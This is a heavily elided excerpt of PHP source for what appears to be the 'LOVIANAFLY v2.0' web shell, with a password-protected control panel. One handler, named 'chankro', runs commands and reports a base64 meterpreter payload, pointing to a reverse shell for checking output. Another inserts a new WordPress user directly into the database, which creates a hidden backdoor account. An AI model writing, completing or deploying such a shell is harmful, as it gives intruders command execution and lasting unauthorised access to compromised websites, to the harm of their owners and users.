...
$hashedPassword = "6079755b4bcca05455fc8362eef427e0"; 
    ...
    <body class="bg-gray-900 flex items-center justify-center h-screen">
        <div class="bg-gray-800 p-6 rounded-xl shadow-xl w-full max-w-md text-white">
            <div class="text-center mb-6">
                ...
                <h1 class="text-2xl font-bold mt-2">LOVIANAFLY v2.0</h1>
            ...
            <div class="p-4">
                <div class="flex items-center justify-between mb-6 md:flex hidden">
                    <div class="flex items-center">
                        ...
                        <h1 class="text-xl font-bold cyber-font">LOVIANAFLY<span class="text-blue-400 cyber-glow">v2.0</span></h1>
                    </div>
                ...
                <?php
                    if (isset($_POST['terminal-chankro'])) {
                        ...
                        if(isset($_POST['exechankro'])){
                            ...
                            $viewCommandResult = '<hr><p>Result: base64 : ' . $meterpreter .'</br>If no output appears, <br>please check manually by opening '.$full_url.'<br>Or u can check command with reverse shell script<br>Powered By @ LovianaFly<br><br>';        
...
if (isset($_POST['submitwp'])) {
    ...
    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'LovianaFly', '', '', NOW(), '', 0, 'LovianaFly')";
